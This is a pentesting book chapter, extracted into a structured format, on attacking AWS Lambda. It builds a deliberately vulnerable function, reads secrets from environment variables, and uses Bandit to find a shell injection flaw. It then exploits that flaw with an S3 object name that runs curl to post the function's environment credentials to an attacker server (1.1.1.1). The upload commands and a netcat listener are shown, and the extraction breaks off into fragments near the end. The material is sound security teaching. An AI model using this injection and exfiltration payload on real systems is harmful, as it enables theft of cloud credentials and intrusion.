- en: Security and Pentesting of AWS Lambda
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: AWS Lambda is an amazing service that offers serverless functions and applications
    to users. Basically, you create a Lambda function with some code that you want
    to execute, then you create some sort of trigger, and whenever that trigger is
    fired, your Lambda function will execute. Users are only charged for the time
    it takes a Lambda function to run, which is a maximum of 15 minutes (but that
    can be manually lowered on a per-function basis). Lambda offers a variety of programming
    languages to use for your functions, and it has even gone as far as allowing you
    to set up your own runtime to use languages that it doesn't directly support yet.
    One thing that we should make clear before diving into all of this is what serverless
    is. Although serverless makes it sound like there are no servers involved, Lambda
    is basically just spinning up an isolated server for the duration that a function
    needs to run. So, there are still servers involved, but provisioning, hardening,
    and so on are all taken out of your hands as the user.
  prefs: []
  type: TYPE_NORMAL
- en: What that means for attackers is that we can still execute code, work with the
    filesystem, and perform most of the other activities that you can perform on a
    regular server, but there are a few caveats. One is that the entire filesystem
    is mounted as read-only, which means you can't modify anything on the system directly,
    except in the `/tmp` directory. The `/tmp` directory is provided for a temporary
    location that files can be written to as needed during the execution of a Lambda
    function. Another is that there is no way you are getting root on these servers.
    Plain and simple, you just need to accept that you will forever be a low-level
    user in Lambda functions. If you do somehow find a way to escalate to the root
    user, I'm sure the people on the AWS security team will love to hear about it.
  prefs: []
  type: TYPE_NORMAL
- en: An example scenario of when you might use Lambda in the real world would be
    virus scanning any file that is uploaded to a specific S3 bucket in the account.
    Each time a file was uploaded to that bucket, the Lambda function would be triggered,
    and it would be passed the details of the upload event. Then, the function might
    download that file to the `/tmp` directory, and then use something like ClamAV
    ([https://www.clamav.net/](https://www.clamav.net/)) to run a virus scan on it.
    If the scan passed, the execution would complete. If the scan flaged the file
    as a virus, it might then delete the corresponding object in S3.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Setting up a vulnerable Lambda function
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Attacking Lambda functions with read access
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Attacking Lamda functions with read-write access
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Pivoting into virtual private clouds
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Setting up a vulnerable Lambda function
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The previous example of a Lambda function that's used to virus scan files in
    S3 is a similar but more complex version of what we are going to set up in our
    own environment. Our function will get triggered when a file is uploaded to an
    S3 bucket that we specify, where it will then download that file, inspect the
    contents, and then place tags on the object in S3, depending on what it finds.
    This function will have a few programming mistakes that open it up to exploitation
    for the sake of our demo, so don't go running this in your production account!
  prefs: []
  type: TYPE_NORMAL
- en: 'Before we get started on creating the Lambda function, let''s first set up
    the S3 buckets that will trigger our function and the IAM role that our function
    will assume. Navigate to the S3 dashboard (click on the Services drop-down menu
    and search for S3) and click on the Create bucket button:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)'
  prefs: []
  type: TYPE_IMG
- en: The Create bucket button on the S3 dashboard
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, give your bucket a unique name; we will be using bucket-for-lambda-pentesting,
    but you''ll likely need to choose something else. For the region, we are selecting
    US West (Oregon), which is also known as `us-west-2`. Then, click on Next, then
    Next again, and then Next again. Leave everything on those pages as the default.
    Now, you should be presented with a summary of your S3 bucket. Click on Create
    bucket to create it:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)'
  prefs: []
  type: TYPE_IMG
- en: The final button to click to create your S3 bucket
  prefs: []
  type: TYPE_NORMAL
- en: Now, click on the bucket name when it shows up in your list of buckets, and
    that will complete the setup of the S3 bucket for our Lambda function (for now).
  prefs: []
  type: TYPE_NORMAL
- en: 'Leave that tab open in your browser, and in another tab, open the IAM dashboard
    (Services | IAM). Click on Roles in the list on the left side of the screen, and
    then click on the Create role button in the top left. Under Select type of trusted
    entity, choose AWS service, which should be the default. Then, under Choose the
    service that will use this role, choose Lambda**,** and then click on Next: Permissions:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)'
  prefs: []
  type: TYPE_IMG
- en: Creating a new role for our Lambda function to assume
  prefs: []
  type: TYPE_NORMAL
- en: On this page, search for the AWS managed policy, `AWSLambdaBasicExecutionRole`,
    and click on the checkbox next to it. This policy will allow our Lambda function
    to push execution logs to CloudWatch, and it is, in a sense, the minimum set of
    permissions that a Lambda function should be provided. It is possible to revoke
    these permissions, but then the Lambda function will keep trying to write logs,
    and it will keep getting access denied responses, which would be noisy to someone
    watching.
  prefs: []
  type: TYPE_NORMAL
- en: Now, search for the AWS managed policy, `AmazonS3FullAccess` , and click on
    the checkbox next to it. This will provide our Lambda function with the ability
    to interact with the S3 service. Note that this policy is far too permissive for
    our Lambda function use case, because it allows for full S3 access to any S3 resource,
    when technically we will only need a few S3 permissions on our single bucket-for-lambda-pentesting
    S3 bucket. Often, you will find over-privileged resources in an AWS account that
    you are attacking, which does nothing more than benefit you as an attacker, so
    that will be a part of our demo scenario here.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, click on the Next: Tags button on the bottom right of the screen. We don''t
    need to add any tags to this role, as those are typically used for other reasons
    than what we need to worry about right now, so just click on Next: Review now.
    Now, create a name for your role; we will be naming it `LambdaRoleForVulnerableFunction`
    for this demo, and we will be leaving the role description as the default, but
    you can write your own description in there if you would like. Now, finish this
    part off by clicking on Create role on the bottom right of the screen. If everything
    went smoothly, you should see a success message at the top of the screen:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)'
  prefs: []
  type: TYPE_IMG
- en: Our IAM role was successfully created
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we can start to create the actual vulnerable Lambda function. To do
    so, navigate to the Lambda dashboard (Services | Lambda), and then click on Create
    a function, which should appear on the welcome page (because presumably, you don't
    have any functions created already). Note that this is still in the US West (Oregon)/`us-west-2`
    region, just like our S3 bucket.
  prefs: []
  type: TYPE_NORMAL
- en: Then, select Author from scratch at the top. Now, give your function a name.
    We will be naming it `VulnerableFunction` for this demo. Next, we need to select
    our runtime, which can be a variety of different programming languages. For this
    demo, we will choose Python 3.7 as our runtime.
  prefs: []
  type: TYPE_NORMAL
- en: 'For the Role option, select Choose an existing role, and then under the Existing
    role option, select the role that we just created (LambdaRoleForVulnerableFunction).
    To finish it off, click on Create function in the bottom right:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)'
  prefs: []
  type: TYPE_IMG
- en: All the options set for our new vulnerable Lambda function
  prefs: []
  type: TYPE_NORMAL
- en: You should now drop into the dashboard for the new vulnerable function, which
    lets you view and configure various settings for the Lambda function.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can ignore most of the stuff on this page for the time being, but if you''d
    like to learn more about Lambda itself, I suggest reading the AWS user guide for
    it at: [https://docs.aws.amazon.com/lambda/latest/dg/welcome.html](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html).
    For now, scroll down to the Function code section. We can see that the value under
    Handler is `lambda_function.lambda_handler`. This means that when the function
    is invoked, the function named `lambda_handler` in the `lambda_function.py` file
    will be executed as the entry point for the Lambda function. The `lambda_function.py`
    file should already be open, but if it''s not, double-click on it in the file
    list to the left of the Function code section:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)'
  prefs: []
  type: TYPE_IMG
- en: The Lambda function handler and what those values are referencing
  prefs: []
  type: TYPE_NORMAL
- en: If you chose a different programming language for the runtime of your function,
    you may encounter a slightly different format, but in general, they should be
    similar.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we have the Lambda function, the IAM role for the Lambda function,
    and our S3 bucket created, we are going to create the event trigger on our S3
    bucket that will then invoke our Lambda function every time it goes off. To do
    this, go back to the browser tab where your bucket-for-lambda-pentesting S3 bucket
    is and click on the Properties tab, and then scroll down to the options under
    Advanced settings and click on the Events button:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)'
  prefs: []
  type: TYPE_IMG
- en: Accessing the Events setting of our S3 bucket
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, click on Add notification and name this notification `LambdaTriggerOnS3Upload`.
    Under the Events section, check the box next to All object create events**,**
    which will suffice for our needs. We''ll want to leave the Prefix and Suffix blank
    for this notification. Click on the Send to drop-down menu and select Lambda Function,
    which should show another drop-down menu where you can select the function we
    created, `VulnerableFunction`. To wrap it all up, click on Save:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)'
  prefs: []
  type: TYPE_IMG
- en: The configuration we want for our new notification
  prefs: []
  type: TYPE_NORMAL
- en: 'After you have clicked on Save, the **Events** button should show 1 Active
    notifications:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)'
  prefs: []
  type: TYPE_IMG
- en: The notification that we just set up.
  prefs: []
  type: TYPE_NORMAL
- en: 'If you switch back to the Lambda function dashboard and refresh the page, you
    should see that S3 has been added as a trigger to our Lambda function on the left-hand
    side of the Designer section:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)'
  prefs: []
  type: TYPE_IMG
- en: The Lambda function is aware that it will be triggered by the notification we
    just set up
  prefs: []
  type: TYPE_NORMAL
- en: Basically, what we have just done is told our S3 bucket that every time an object
    is created (`/uploaded/` , and so on), it should invoke our Lambda function. S3
    will automatically invoke the Lambda function and pass in details related to the
    file uploaded through the `event` parameter, which is one of two that our function
    accepts (`event` and `context`). The Lambda function can read this data by looking
    at the contents of `event` during its execution.
  prefs: []
  type: TYPE_NORMAL
- en: 'To finish off the setup of our vulnerable Lambda function, we need to add some
    vulnerable code to it! On the Lambda function dashboard, under Function code,
    replace the default code with the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: As we continue through this chapter, we will take a deeper look at what is going
    on in this function. In simple terms, this function gets triggered whenever a
    file is uploaded to our S3 bucket; it will confirm that the file has a `.zip`
    extension, and then it will download that file to the `/tmp` directory. Once it
    is downloaded, it will use the `zipinfo`, `grep`, and `wc` programs to count how
    many files are stored in the ZIP file. It will then add a tag to the object in
    S3 that specifies how many files are in that ZIP file. You may or may not already
    be able to see where some things could go wrong, but we will get to that later.
  prefs: []
  type: TYPE_NORMAL
- en: 'One last thing that we will do is drop-down to the Environment variables section
    of the Lambda dashboard and add an environment variable with the key `app_secret`
    and the value `1234567890`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/aed37b17-a967-4953-b477-aa5c0c6db456.png)'
  prefs: []
  type: TYPE_IMG
- en: Adding the app_secret environment variable to our function.
  prefs: []
  type: TYPE_NORMAL
- en: To finish off this section, just click on the big orange Save button in the
    top right of the screen to save this code to your Lambda function, and we will
    be ready to move on.
  prefs: []
  type: TYPE_NORMAL
- en: Attacking Lambda functions with read access
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: To start the read access only section of this chapter, we will be creating a
    new IAM user with a specific set of permissions. This is the user that we will
    use to demo our attack, so we can assume that we just compromised this user's
    keys, through one method or another. These permissions will allow read-only access
    to AWS Lambda and object-upload access to S3, but nothing beyond that. We aren't
    going to walk through the whole process of creating a user, setting up their permissions,
    and adding their keys to the AWS CLI, because we covered that in previous chapters.
  prefs: []
  type: TYPE_NORMAL
- en: 'So, go ahead and create a new IAM user with programmatic access to AWS. For
    this demo, we will be naming that user `LambdaReadOnlyTester`. Next, we will add
    a custom inline IAM policy, using the following JSON document:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, we can use any Lambda API that begins with `List` or `Get`,
    and we can use the S3 `PutObject` API. This is like what I have seen in a lot
    of AWS environments, where a user has broad read access to a variety of resources,
    and then some additional S3 permissions, such as the ability to upload files.
  prefs: []
  type: TYPE_NORMAL
- en: 'The first thing to do when looking at AWS Lambda as an attacker is to fetch
    all the relevant data for each Lambda function in the account. This can be done
    with the Lambda `ListFunctions` API. For this demo, we already know that the function
    we want to attack is in `us-west-2`, but in a real scenario, you''d likely want
    to check every region for Lambda functions that might be interesting. We''ll start
    off by running this AWS CLI command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'We should get back some good info. The first thing to look for are environment
    variables. We set this vulnerable function up ourselves, so the environment variables
    are not big secrets to us, but as an attacker without that prior knowledge, you
    can often discover sensitive information being stored in the environment variables
    of a function. This information is returned to us in the `ListFunctions` call
    that we just made under the `"Environment"` key, where it should look something
    like this for our vulnerable function:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: You can count on finding all sorts of unexpected things in the environment variables
    of Lambda functions. As an attacker, the value of `"app_secret"` sounds interesting.
    During penetration tests in the past, I have found all kinds of secrets in environment
    variables, including usernames/passwords/API keys to third-party services, AWS
    API keys to completely different accounts, and plenty more. Just looking at the
    environment variables of a few Lambda functions has allowed me to escalate my
    own privileges multiple times, so it is important to pay attention to what is
    being stored. We set this vulnerable function up ourselves, so we know that there
    is nothing we can do with the `"app_secret"` environment variable, but it was
    included to demonstrate the idea.
  prefs: []
  type: TYPE_NORMAL
- en: When running the Lambda `ListFunctions` API call, the `"Environment"` key will
    only be included if the function has environment variables set; otherwise, it
    won't show up in the results, so don't be worried if nothing is available there.
  prefs: []
  type: TYPE_NORMAL
- en: 'After checking out the environment variables, it would be a good time to look
    at the code for each Lambda function. To do so from the AWS CLI, we can use the
    list of functions that we got back from `ListFunctions` and run each one through
    the Lambda `GetFunction` API call. For our vulnerable function, we can run the
    following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: The output will look like what is returned for each function when running `ListFunctions`,
    but there is one important distinction, which is the addition of the `Code` key.
    This key will include `RepositoryType` and `Location` keys, which is how we will
    download the code to this function. All we need to do is copy the URL under Code
    | Location and paste it into our web browser. The URL provided is a pre-signed
    URL that gives us access to the S3 bucket where the Lambda code is being stored.
    Once the page is visited, it should download a `.zip` file beginning with `VulnerableFunction`.
  prefs: []
  type: TYPE_NORMAL
- en: If you unzip the file, you will see a single file, `lambda_function.py`, which
    is where the code of the Lambda function is stored. In many cases, there will
    be multiple files in there, such as third-party libraries, configuration files,
    or binaries.
  prefs: []
  type: TYPE_NORMAL
- en: Although our vulnerable function is relatively short, we are going to approach
    it as if it is a large amount of code that we can't just quickly analyze manually
    to simulate a real situation, because you may not be familiar with the programming
    language that the Lambda function is using.
  prefs: []
  type: TYPE_NORMAL
- en: With the function unzipped to our computer, we will now begin static analysis
    of the included code. We know that this function is running Python 3.7 because
    that is what was listed under `Runtime` when we ran `ListFunctions` and `GetFunction`, and
    because the main file is a `.py` file. There are many options for static analysis
    on code, free and paid, and they are different between programming languages,
    but we are going to be using `Bandit`, which is described as a tool designed to
    find common security issues in Python code. Before moving forward, note that just
    because we are using it here, it does not necessarily mean that it is the best
    and/or that it is perfect. I always suggest doing your own research and trying
    out different tools to find one that you like, but Bandit is one that I personally
    like to work with. Bandit is hosted on GitHub at [https://github.com/PyCQA/bandit](https://github.com/PyCQA/bandit)[.](https://github.com/PyCQA/bandit)
  prefs: []
  type: TYPE_NORMAL
- en: 'The installation of Bandit is simple, because it is offered through PyPI, which
    means we can use the Python package manager, `pip`, to install it. Following the
    instructions on the Bandit GitHub, we will run the following commands (be sure
    to check for yourself, in case anything has been updated since this was written):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'We use `virtualenv`, so as to not cause any issues with our Python dependencies
    being installed, and then we use `pip3` to install `bandit`, because the code
    we want to analyze is written in Python 3\. At the time of writing, Bandit version
    1.5.1 was installed, so be aware of your own installed version if you run into
    any issues throughout the rest of this section. Once installed, we can change
    directories to the directory where we unzipped the Lambda function, then use the
    `bandit` command to target the folder with our code. We can use the following
    command to do that:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'Now the Lambda function will be scanned, where the `-r` flag specifies recursive,
    as in scan every file in the `VulnerableFunction` folder. We only have one file
    in there right now, but it''s good to know what that flag does for the bigger
    Lambda functions we are scanning. After Bandit finishes, we will see that it reported
    on three separate issues: one with low severity and high confidence, one with
    medium severity and medium confidence, and one with high severity and high confidence:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)'
  prefs: []
  type: TYPE_IMG
- en: The results that were output by Bandit
  prefs: []
  type: TYPE_NORMAL
- en: Typically, static source code analysis tools will output a reasonable number
    of false positives, so it is important to go through each issue to verify whether
    it is a real issue. Static analysis tools also lack context on how the code may
    be used, so a security issue may be a problem for some code, but not a big deal
    for others. We will look at context more when reviewing the second issue presented
    by Bandit.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the first issue that Bandit reported, we can see the message `Consider
    possible security implications associated with the subprocess module`, which makes
    a lot of sense. The subprocess module is used to spawn new processes on the machine,
    which could pose a security risk if not done correctly. We will go ahead and mark
    this as a valid issue, but it's more something to keep in mind when reviewing
    the code.
  prefs: []
  type: TYPE_NORMAL
- en: The second issue that Bandit reported tells us `Probable insecure usage of temp
    file/directory`, and it shows us the lines of code where a variable is assigned
    the value of a file path in the `/tmp` directory, appended with another variable, `object_key`.
    This is a security issue that may be a big issue in some applications, but given
    the context of our Lambda function, we can assume that it is not a problem in
    this situation. Why? Part of the security risk comes with the possibility of a
    user being able to control the file path. A user could potentially insert a path
    traversal sequence or do something like trick the script into writing that temporary
    file to somewhere else, such as `/etc/shadow`, which could have dangerous consequences.
    This isn't an issue for us, because the code is being run in Lambda, which means
    it is running on a read-only filesystem; so, even if someone was able to traverse
    out of the `/tmp` directory, the function would fail to overwrite any important
    files on the system. There are other possible issues that could arise here, but
    nothing directly applicable to us, so we can go ahead and cross this issue off
    as a false positive.
  prefs: []
  type: TYPE_NORMAL
- en: Moving on to the final and most severe issue raised by Bandit, we are shown
    `subprocess call with shell=True identified, security issue`, which sounds juicy.
    This is telling us that a new process is being spawned with access to the operating
    systems shell, which might mean that we can inject shell commands! Looking at
    the line that Bandit flagged (line 30), we can even see a Python variable (`file_download_path`)
    directly concatenated into the command that is being run. That means that if we
    can somehow take control of that value, we can modify the command being run on
    the operating system to execute arbitrary code.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we want to see where `file_download_path` is assigned a value. We know
    that its assignment showed up in issue #2 from Bandit (on line 25), which looks
    like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: Just like the string from line 30, Python 3 `f` strings are being used (see
    [https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)
    for more information), which basically allow you to embed variables and code within
    strings, so you don't have to do any messy concatenation, with plus signs or anything
    like that. What we can see here is that `file_download_path` is a string that
    includes another variable in the code, `object_key`, which gets split at each `"/"`
    in it. Then, the `[-1]` is saying to use the last element of the list that was
    created from splitting at `"/"`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, if we trace back the `object_key` variable to see where it gets assigned,
    we can see on line 13 that it is assigned the value of `record[''s3''][''object''][''key'']`.
    Okay, so we can see that the function is expecting the `event` variable to contain
    information about an S3 object (as well as an S3 bucket, on line 11). We want
    to figure out if we can somehow control the value of that variable, but given
    the context we have as an attacker, we have no idea when (or if) this function
    even gets invoked regularly, and we don''t know how, either. The first thing we
    can check for is if there are any event source mappings associated with our Lambda
    function. This can be accomplished with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'In this scenario, we should get nothing back but an empty list, like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: Event source mappings are basically a way of hooking up a Lambda function to
    another service, so that it can be triggered when something else in that service
    happens. An example event source mapping would be with DynamoDB, where every time
    an item gets modified in a DynamoDB table, it triggers a Lambda function with
    the contents that were added to the table. As you can see, there is nothing like
    this associated with our current function, but it is no time to panic! Not every
    source of automated triggering will show up as an event source mapping.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next step will be to look at the Lambda functions resource policy, which
    basically specifies what can invoke this function. To fetch the resource policy,
    we will use the `GetPolicy` API:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: If we're lucky, we will get a JSON object in response to this API call, but
    if not, we may receive an API error that the resource could not be found. This
    would indicate that there is no resource policy set up for the Lambda function.
    If that is the case, then we likely won't be able to invoke this Lambda function
    in any way, unless we happen to have the `lambda:InvokeFunction` permission (but
    we don't in this case).
  prefs: []
  type: TYPE_NORMAL
- en: 'Today must be our lucky day, because a policy is returned to us. It should
    look something like the following, except that `000000000000` will be replaced
    by your own AWS account ID, and the revision ID will be different, as well:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'Messy and hard to read, right? Well, that is because a JSON object is being
    stored as a string, as the value of a key in another JSON object. To make this
    a little clearer, we can copy the whole value from within the `"Policy"` key,
    remove the escape characters (`\`), and add some nice indentation, and we will
    then end up with this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: That looks a bit better, doesn't it? What we are looking at is a JSON policy
    document that specifies what can invoke this Lambda function, and we can tell
    that because the `"Action"` is set to `"lambda:InvokeFunction"`. Next, we can
    look at the `"Principal"`, which is set to the AWS service S3\. That sounds right,
    because we know the function is handling S3 objects. Under `"Resource"`, we see
    the ARN for the Lambda function, as expected. Under `"Condition"`, we see that
    the `"AWS:SourceAccount"` must be `000000000000`, which is the account ID that
    we are working in, so that's good. There's also `"ArnLike"` under `"Condition"`,
    which shows an ARN of an S3 bucket. We don't have the S3 permissions required
    to go and confirm this information, but we can make a reasonable assumption that
    some sort of S3 event has been set up to invoke this function when something happens
    (and we know this is true because we set it up earlier).
  prefs: []
  type: TYPE_NORMAL
- en: Another big hint can be found in the `"Sid"` key, where we see the value `"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`,
    which shows us `"LambdaTriggerOnS3Upload"`. We can now make an educated guess
    that this Lambda function is invoked when files are uploaded to the S3 bucket, `"bucket-for-lambda-pentesting"`.
    If you remember when we set these resources up, `"LambdaTriggerOnS3Upload"` is
    what we named the event trigger that we added to our S3 bucket earlier, so in
    this case, a verbose naming scheme helped us out as an attacker. What's even better
    is that we know we have the `"s3:PutObject"` permission applied to our compromised
    user!
  prefs: []
  type: TYPE_NORMAL
- en: We have all the pieces to the puzzle now. We know that the Lambda function runs
    a shell command with a variable (`file_download_path`), and we know that variable
    is comprised of another variable `(object_key`), which we know gets set to the
    value `record['s3']['object']['key']`. We also know that this Lambda function
    gets invoked whenever a file is uploaded to the `"bucket-for-lambda-pentesting"`
    S3 bucket, and that we have the necessary permissions to upload files to that
    bucket. Given all of that, that means we can upload a file with a name that we
    choose, that will eventually get passed down into a shell command, which is exactly
    what we want if we are trying to execute code on the system!
  prefs: []
  type: TYPE_NORMAL
- en: But hold on; what benefit is there to executing arbitrary code on a server running
    a Lambda function when it is a read-only filesystem and we already have the source
    code? More credentials, that's the benefit! If you recall from earlier, we needed
    to create an IAM role to attach to the Lambda function we created, which then
    allowed our function to authenticate with the AWS APIs. When a Lambda function
    runs, it assumes the IAM role attached to it and gets a set of temporary credentials
    (remember, that is an access key ID, secret access key, and session token). Lambda
    functions are a bit different than EC2 instances, which means there is no metadata
    service at `http://169.254.169.254`, which again means we can't retrieve those
    temporary credentials through there. Lambda does it differently; it stores the
    credentials in environment variables, so once we can execute code on the server,
    we can exfiltrate those credentials, where we would then have access to all the
    permissions associated with the role attached to the Lambda function.
  prefs: []
  type: TYPE_NORMAL
- en: In this case, we know that the LambdaRoleForVulnerableFunction IAM role has
    ­full S3 access, which is quite a lot more than our measly `PutObject` access,
    and it also has a few CloudWatch log permissions. We don't currently have access
    to reading logs in CloudWatch, so we will need to exfiltrate the credentials to
    a server we control. Otherwise, we won't be able to read the values.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, let''s get started with our payload. Sometimes, it might help you to formulate
    a payload if you copy the entire Lambda function over to your own AWS account,
    where you can just blast it with payloads until you find something that works,
    but we are going to try this out manually first. We know that we essentially control
    the `object_key` variable, which eventually gets placed into a shell command.
    So, if we passed in a harmless value of `"hello.zip"`, we will see the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: There only seems to be one restriction that we need to worry about, and that
    is that the code checks whether the file has a `.zip` extension on line 16\. Given
    all this information, we can now start to work on our malicious payload.
  prefs: []
  type: TYPE_NORMAL
- en: The `zipinfo /tmp/hello.zip` command has our user-supplied string directly in
    it, so we just need to break this command up to run our own arbitrary commands.
    If we changed `hello.zip` to something like `hello;sleep 5;.zip`, then the final
    command would end up being `"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`.
    We inserted a couple of semicolons, which cause the shell interpreter (bash) to
    think that there is more than one command to be executed. Instead of a single
    command, `zipinfo /tmp/hello.zip`, being run, it will instead run `"zipinfo /tmp/hello"`,
    which will fail because that isn't a file that exists; then, it will run `"sleep
    5"` and sleep for five seconds, and then it will run `".zip"`, which isn't a real
    command, so an error will be thrown.
  prefs: []
  type: TYPE_NORMAL
- en: Just like that, we have injected a command (`sleep 5`) into the Lambda server's
    shell. Now, because this is blind (as in, we can't see the output of any of our
    commands), we need to exfiltrate the important information that we want. The operating
    system supporting Lambda functions has `"curl"` installed by default, so that
    will be an easy way to make an external request, and we know that the AWS credentials
    are stored in environment variables, so we just need to `curl` the credentials
    to a server we control.
  prefs: []
  type: TYPE_NORMAL
- en: 'To do this, I have set up a NetCat listener on my own server (with the IP address
    `1.1.1.1` as an example for this demo) that has port `80` open, with the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, we''ll formulate our payload that will exfiltrate the credentials. We
    can access the environment variables with the `"env"` command, so the general
    command to make an HTTP POST request to our external server with curl that includes
    all of the environment variables as the body will be as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: It might look a little funky, but because the `"env"` command provides multiline
    content, it needs to be put into quotes, or else it will mess up the entire command
    (try running `"curl -X POST -d `env` 1.1.1.1"` against your own server and look
    at the results). If you are not familiar, the backticks ([PRE16]
  prefs: []
  type: TYPE_NORMAL
- en: hello;curl -X POST -d "`env`" 1.1.1.1;.zip
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting
    --profile LambdaReadOnlyTester
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: aws iam list-roles --profile LambdaReadWriteUser
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: '{'
  prefs: []
  type: TYPE_NORMAL
- en: '"Path": "/",'
  prefs: []
  type: TYPE_NORMAL
- en: '"RoleName": "LambdaRoleForVulnerableFunction",'
  prefs: []
  type: TYPE_NORMAL
- en: '"RoleId": "AROAIWA1V2TCA1TNPM9BL",'
  prefs: []
  type: TYPE_NORMAL
- en: '"Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",'
  prefs: []
  type: TYPE_NORMAL
- en: '"CreateDate": "2018-12-19T21:01:17Z",'
  prefs: []
  type: TYPE_NORMAL
- en: '"AssumeRolePolicyDocument": {'
  prefs: []
  type: TYPE_NORMAL
- en: '"Version": "2012-10-17",'
  prefs: []
  type: TYPE_NORMAL
- en: '"Statement": ['
  prefs: []
  type: TYPE_NORMAL
- en: '{'
  prefs: []
  type: TYPE_NORMAL
- en: '"Effect": "Allow",'
  prefs: []
  type: TYPE_NORMAL
- en: '"Principal": {'
  prefs: []
  type: TYPE_NORMAL
- en: '"Service": "lambda.amazonaws.com"'
  prefs: []
  type: TYPE_NORMAL
- en: '},'
  prefs: []
  type: TYPE_NORMAL
- en: '"Action": "sts:AssumeRole'
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: ']'
  prefs: []
  type: TYPE_NORMAL
- en: '},'
  prefs: []
  type: TYPE_NORMAL
- en: '"Description": "Allows Lambda functions to call AWS services on your behalf.",'
  prefs: []
  type: TYPE_NORMAL
- en: '"MaxSessionDuration": 3600'
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: import json
  prefs: []
  type: TYPE_NORMAL
- en: import boto3
  prefs: []
  type: TYPE_NORMAL
